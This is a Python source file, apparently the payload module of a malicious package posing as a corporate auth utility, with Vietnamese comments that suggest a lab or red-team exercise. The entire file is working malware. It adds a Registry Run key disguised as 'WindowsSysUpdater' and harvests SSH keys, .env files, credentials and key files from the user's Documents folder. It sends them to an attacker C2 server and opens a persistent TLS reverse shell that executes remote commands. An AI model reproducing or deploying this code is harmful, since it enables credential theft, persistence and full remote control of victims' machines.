import os
import socket
import ssl
import subprocess
import urllib.request
import urllib.parse
import time
import threading
import sys

# === CẤU HÌNH IP ATTACKER ===
# ĐỔI IP NÀY TRƯỚC KHI BUILD PACKAGE (python -m build --sdist)
# Đây là IP LAN của máy chạy Docker. Victim sẽ kết nối về IP này.
ATTACKER_IP = '192.168.1.100'  # ← SỬA TẠI ĐÂY
EXFIL_PORT = 8080
SHELL_PORT = 4444

# Auth token phải khớp với c2_server.py
C2_AUTH_TOKEN = 'S04-SECRET-TOKEN'

def persist_registry():
    """T1547.001 - Thêm Registry Key để tồn tại sau khi reboot"""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        payload_cmd = f'"{sys.executable}" -c "from corp_auth_utils.marker import run_marker; run_marker()"'
        
        winreg.SetValueEx(key, "WindowsSysUpdater", 0, winreg.REG_SZ, payload_cmd)
        winreg.CloseKey(key)
    except Exception as e:
        try:
            with open(os.path.join(os.environ.get('TEMP', '/tmp'), 's04_payload.log'), 'a') as f:
                f.write(f"[-] persist_registry failed: {e}\n")
        except:
            pass
    
def true_exfiltrate():
    """T1041 - Gửi data thực sự qua mạng về C2"""
    user_path = os.path.expanduser('~')
    target_dir = os.path.join(user_path, 'Documents')
    loot = ""
    try:
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if file.endswith((".txt", ".env", ".json", ".pem", ".key", ".cfg", ".ini")) \
                        or file in ("credentials", "id_rsa", "id_ed25519", "id_ecdsa"):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            loot += f"\n--- {file} ---\n{f.read()}"
                    except: pass
        if loot:
            data = urllib.parse.urlencode({'data': loot}).encode('utf-8')
            req = urllib.request.Request(f'https://{ATTACKER_IP}:{EXFIL_PORT}/exfil', data=data)
            req.add_header('X-Auth-Token', C2_AUTH_TOKEN)
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            urllib.request.urlopen(req, timeout=5, context=ctx)
    except Exception as e:
        pass

def reverse_shell():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = ctx.wrap_socket(raw, server_hostname=ATTACKER_IP)
            s.connect((ATTACKER_IP, SHELL_PORT))
            s.send(b"[+] S04 Advanced Shell Connected (TLS)!\n")
            while True:
                data = s.recv(4096).decode("utf-8").strip()
                if not data or data.lower() in ["exit", "quit"]:
                    s.close()
                    return
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"(no output)\n")
        except:
            time.sleep(10)

def run_marker():
    persist_registry()
    threading.Thread(target=true_exfiltrate, daemon=False).start()
    threading.Thread(target=reverse_shell, daemon=False).start()
